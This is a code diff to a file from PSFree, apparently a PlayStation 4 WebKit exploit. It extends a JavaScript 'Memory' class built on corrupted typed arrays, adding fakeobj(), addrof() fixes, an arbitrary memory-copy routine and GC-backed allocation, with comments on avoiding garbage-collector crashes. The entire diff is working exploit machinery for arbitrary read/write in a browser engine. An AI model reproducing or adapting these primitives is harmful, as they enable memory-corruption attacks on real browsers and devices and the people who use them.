@@ -1,4 +1,4 @@
-/* Copyright (C) 2023-2024 anonymous
+/* Copyright (C) 2023-2025 anonymous
 
 This file is part of PSFree.
 
@@ -46,7 +46,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -58,7 +58,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -70,7 +70,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -82,7 +82,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -94,7 +94,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -106,7 +106,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -118,7 +118,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -130,7 +130,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -142,7 +142,7 @@ export class Addr extends Int {
         if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
             m._set_addr_direct(this);
         } else {
-            add_and_set_addr(m, offset, this.low, this.high);
+            add_and_set_addr(m, offset, this.lo, this.hi);
             offset = 0;
         }
 
@@ -154,31 +154,114 @@ export class Addr extends Int {
 // * main - Uint32Array whose m_vector points to worker
 // * worker - DataView
 //
-// addrof() expectations:
-// * obj - we will store objects at .addr
-// * addr_addr - Int where to read out the address. the address used to store
-//   the value of .addr
+// addrof()/fakeobj() expectations:
+// * obj - has a "addr" property and a 0 index.
+// * addr_addr - Int, the address of the slot of obj.addr
+// * fake_addr - Int, the address of the slot of obj[0]
+//
+// a valid example for "obj" is "{addr: null, 0: 0}". note that this example
+// has [0] be 0 so that the butterfly's indexing type is ArrayWithInt32. this
+// prevents the garbage collector from incorrectly treating the slot's value as
+// a JSObject and then crash
 //
 // the relative read/write methods expect the offset to be a unsigned 32-bit
 // integer
 export class Memory {
-    constructor(main, worker, obj, addr_addr)  {
+    constructor(main, worker, obj, addr_addr, fake_addr)  {
         this._main = main;
         this._worker = worker;
         this._obj = obj;
-        this._addr_low = addr_addr.low;
-        this._addr_high = addr_addr.high;
+        this._addr_low = addr_addr.lo;
+        this._addr_high = addr_addr.hi;
+        this._fake_low = fake_addr.lo;
+        this._fake_high = fake_addr.hi;
 
         main[view_m_length / 4] = 0xffffffff;
 
         init_module(this);
+
+        const off_mvec = view_m_vector;
+        // use this to create WastefulTypedArrays to avoid a GC crash
+        const buf = new ArrayBuffer(0);
+
+        const src = new Uint8Array(buf);
+        const sset = new Uint32Array(buf);
+        const sset_p = this.addrof(sset);
+        sset_p.write64(off_mvec, this.addrof(src).add(off_mvec));
+        sset_p.write32(view_m_length, 3);
+        this._cpysrc = src;
+        this._src_setter = sset;
+
+        const dst = new Uint8Array(buf);
+        const dset = new Uint32Array(buf);
+        const dset_p = this.addrof(dset);
+        dset_p.write64(off_mvec, this.addrof(dst).add(off_mvec));
+        dset_p.write32(view_m_length, 3);
+        dset[2] = 0xffffffff;
+        this._cpydst = dst;
+        this._dst_setter = dset;
+    }
+
+    // dst and src may overlap
+    cpy(dst, src, len) {
+        if (!(isInteger(len) && 0 <= len && len <= 0xffffffff)) {
+            throw TypeError('len not a unsigned 32-bit integer');
+        }
+
+        const dvals = lohi_from_one(dst);
+        const svals = lohi_from_one(src);
+        const dset = this._dst_setter;
+        const sset = this._src_setter;
+
+        dset[0] = dvals[0];
+        dset[1] = dvals[1];
+        sset[0] = svals[0];
+        sset[1] = svals[1];
+        sset[2] = len;
+
+        this._cpydst.set(this._cpysrc);
+    }
+
+    // allocate Garbage Collector managed memory. returns [address_of_memory,
+    // backer]. backer is the JSCell that is keeping the returned memory alive,
+    // you can drop it once you have another GC object reference the address.
+    // the backer is an implementation detail. don't use it to mutate the
+    // memory
+    gc_alloc(size) {
+        if (!isInteger(size)) {
+            throw TypeError('size not a integer');
+        }
+        if (size < 0) {
+            throw RangeError('size is negative');
+        }
+
+        const fastLimit = 1000;
+        size = (size + 7 & ~7) >> 3;
+        if (size > fastLimit) {
+            throw RangeError('size is too large');
+        }
+
+        const backer = new Float64Array(size);
+        return [mem.addrof(backer).readp(view_m_vector), backer];
+    }
+
+    fakeobj(addr) {
+        const values = lohi_from_one(addr);
+        const worker = this._worker;
+        const main = this._main;
+
+        main[off_vector] = this._fake_low;
+        main[off_vector2] = this._fake_high;
+        worker.setUint32(0, values[0], true);
+        worker.setUint32(4, values[1], true);
+        return this._obj[0];
     }
 
     addrof(object) {
         // typeof considers null as a object. blacklist it as it isn't a
         // JSObject
-        if ((typeof object !== 'object' || object === null)
-            && typeof object !== 'function'
+        if (object === null
+            || (typeof object !== 'object' && typeof object !== 'function')
         ) {
             throw TypeError('argument not a JS object');
         }
@@ -204,8 +287,8 @@ export class Memory {
     // expects addr to be a Int
     _set_addr_direct(addr) {
         const main = this._main;
-        main[off_vector] = addr.low;
-        main[off_vector2] = addr.high;
+        main[off_vector] = addr.lo;
+        main[off_vector2] = addr.hi;
     }
 
     set_addr(addr) {
@@ -216,6 +299,7 @@ export class Memory {
     }
 
     get_addr() {
+        const main = this._main;
         return new Addr(main[off_vector], main[off_vector2]);
     }
 
@@ -289,14 +373,6 @@ export class Memory {
             worker.getUint32(offset + 4, true),
         );
     }
-
-    // writes using 0 as a base address don't work because we are using a
-    // DataView as a worker. work around this by doing something like "new
-    // Addr(-1, -1).write8(1, 0)"
-    //
-    // see setIndex() from
-    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
-    // 8.00
 
     write8(addr, value) {
         this.set_addr(addr);
